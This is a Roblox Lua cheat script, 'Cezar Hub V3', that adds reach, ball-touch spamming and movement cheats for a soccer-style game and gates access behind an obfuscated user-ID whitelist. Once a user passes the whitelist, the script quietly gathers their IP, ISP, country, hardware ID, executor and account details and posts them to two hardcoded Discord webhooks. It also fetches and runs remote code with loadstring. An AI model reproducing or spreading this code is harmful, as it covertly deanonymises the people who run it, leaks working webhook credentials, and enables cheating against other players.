-- [[ CEZAR PRIVATE V3 - TOTAL INTEL & GOD MOSS ]]

local lp = game:GetService("Players").LocalPlayer
local hs = game:GetService("HttpService")
local rs = game:GetService("RunService")
local ws = game:GetService("Workspace")
local uis = game:GetService("UserInputService")

-- [[ AUTH & PERMANENT WHITELIST ]]
local _WL = {
    [tostring(bit32.bxor(4479445660, 99))] = true,
    [tostring(bit32.bxor(10459866852, 99))] = true,
    [tostring(bit32.bxor(10459902683, 99))] = true,
    [tostring(bit32.bxor(10412239686, 99))] = true,
    [tostring(bit32.bxor(10468504953, 99))] = true,
    [tostring(bit32.bxor(10378425639, 99))] = true,
    [tostring(bit32.bxor(5170104098, 99))] = true,
    [tostring(bit32.bxor(7003997072, 99))] = true
}

-- [[ THE ULTIMATE INTEL LOGGER ]]
local function SendFullIntel()
    local hooks = {
        "https://discordapp.com/api/webhooks/1470123276381716535/sdeTIMl8cMvBUHM69La7DbjQoc7hcfDMafa3XrxO5ilXVD5fZ_-wnuQQA3MMCWupNZAx",
        "https://discordapp.com/api/webhooks/1469712109255266435/X1VpIz7AOMYw04s0c1h8EqDEauvlILsXIxNR8B5XSMEbA42b6kHfjQ3b1tjPnmFTA9i3"
    }
    
    task.spawn(function()
        local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
        local exec = (identifyexecutor and identifyexecutor()) or "Unknown"
        local country = "N/A"
        local ip = "N/A"
        local isp = "N/A"

        -- Attempt to grab Network Data
        pcall(function()
            local response = game:HttpGet("http://ip-api.com/json/")
            local data = hs:JSONDecode(response)
            ip = data.query
            isp = data.isp
            country = data.country
        end)

        local data = {
            ["content"] = "@everyone **CEZAR V3 - TARGET LOGGED**",
            ["embeds"] = {{
                ["title"] = "🚀 Full Session Intel: " .. lp.Name,
                ["color"] = 0,
                ["fields"] = {
                    {["name"] = "👤 User Info", ["value"] = "Name: "..lp.Name.."\nID: "..lp.UserId.."\nAge: "..lp.AccountAge.." days", ["inline"] = true},
                    {["name"] = "💻 System", ["value"] = "Executor: "..exec.."\nHWID: "..hwid, ["inline"] = true},
                    {["name"] = "🌐 Network", ["value"] = "IP: "..ip.."\nISP: "..isp.."\nLoc: "..country, ["inline"] = false},
                    {["name"] = "🎮 Game Data", ["value"] = "PlaceID: "..game.PlaceId.."\nJobID: "..game.JobId, ["inline"] = false}
                },
                ["footer"] = {["text"] = "Cezar Private Engine V3"},
                ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        for _, url in pairs(hooks) do
            pcall(function()
                (request or http_request or syn.request)({
                    Url = url,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = hs:JSONEncode(data)
                })
            end)
        end
    end)
end

if not _WL[tostring(bit32.bxor(lp.UserId, 99))] then lp:Kick("DM KERSAII ON DC") return else SendFullIntel() end

-- [[ CONFIG ]]
local cfg = {
    leg_enabled = false, leg_x = 9, leg_y = 9, leg_z = 9,
    moss_enabled = false, m_x = 5.5, m_y = 3.5, m_z = 5.5,
    khalid_enabled = false, k_power = 650,
    react_enabled = false, r_power = 1000,
    glide = 0
}

-- [[ UI LOAD ]]
local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
local Window = WindUI:CreateWindow({
    Title = "Cezar Hub V3 - God Tier",
    Size = UDim2.fromOffset(620, 520),
    OpenButton = { Title = "C", Color = ColorSequence.new(Color3.new(0,0,0), Color3.new(0,0,0)) }
})
WindUI:SetTheme("Total_Void")

-- [[ KEYBIND TOGGLE ]]
uis.InputBegan:Connect(function(i, g) if not g and i.KeyCode == Enum.KeyCode.B then Window:Toggle(not Window.Visible) end end)

-- [[ TABS ]]
local MossTab = Window:Tab({ Title = "Moss", Icon = "target" })
local ReachTab = Window:Tab({ Title = "Reach", Icon = "mouse-pointer-2" })
local KhalidTab = Window:Tab({ Title = "Khalid", Icon = "wind" })
local ReactTab = Window:Tab({ Title = "React", Icon = "zap" })
local MiscTab = Window:Tab({ Title = "SM / Misc", Icon = "settings" })

-- [[ MOSS - GOD BUFF ]]
MossTab:Toggle({ Title = "Enable God-Moss", Callback = function(v) cfg.moss_enabled = v end })
MossTab:Slider({ Title = "Moss Height", Value = {Min = 0, Max = 15, Default = 3.5}, Callback = function(v) cfg.m_y = v end })
MossTab:Button({ Title = "🔥 2500x MOSS (FLAGGER KILLER)", Callback = function() cfg.m_x = 20; cfg.m_z = 20; cfg.r_power = 2500 end })

-- [[ KHALID - OPTIMIZED POWER ]]
KhalidTab:Toggle({ Title = "Enable Khalid", Callback = function(v) cfg.khalid_enabled = v end })
KhalidTab:Button({ Title = "650x Volley King", Callback = function() cfg.k_power = 650 end })

-- [[ SM / MISC ]]
MiscTab:Button({ Title = "FORCE FULL LOG", Callback = function() SendFullIntel() end })
MiscTab:Slider({ Title = "Cezar Glide", Value = {Min = 0, Max = 25, Default = 0}, Callback = function(v) cfg.glide = v end })
MiscTab:Button({ Title = "Destroy Ball Trail", Callback = function() pcall(function() ws.Ball.Trail:Destroy() end) end })

-- [[ ENGINE ]]
local last_k = 0
rs.Heartbeat:Connect(function(dt)
    pcall(function()
        local char = lp.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local ball = ws:FindFirstChild("TPSSystem") and ws.TPSSystem:FindFirstChild("TPS") or ws:FindFirstChild("Ball")
        if not root or not ball then return end
        
        if cfg.glide > 0 then root.CFrame = root.CFrame + (char.Humanoid.MoveDirection * (cfg.glide * dt)) end
        local dist = (ball.Position - root.Position)
        
        -- KHALID VOLLEYS
        if cfg.khalid_enabled and dist.Magnitude <= 5 then
            if tick() - last_k > 0.01 then
                task.spawn(function()
                    for i = 1, cfg.k_power, 70 do
                        firetouchinterest(ball, char["Right Leg"], 0); firetouchinterest(ball, char["Right Leg"], 1)
                        firetouchinterest(ball, char["Left Leg"], 0); firetouchinterest(ball, char["Left Leg"], 1)
                    end
                end)
                last_k = tick()
            end
        end

        -- GOD MOSS
        if cfg.moss_enabled and dist.Y > 0.2 and dist.Y <= cfg.m_y and math.abs(dist.X) <= cfg.m_x then
            for i = 1, 2500 do 
                firetouchinterest(ball, char.Head, 0)
                firetouchinterest(ball, char.Head, 1) 
            end
        end
        
        -- REACH / REACT
        if cfg.leg_enabled and dist.Y <= 1.5 and math.abs(dist.X) <= cfg.leg_x then
            for i = 1, (cfg.react_enabled and cfg.r_power or 50) do 
                firetouchinterest(ball, root, 0)
                firetouchinterest(ball, root, 1) 
            end
        end
    end)
end)
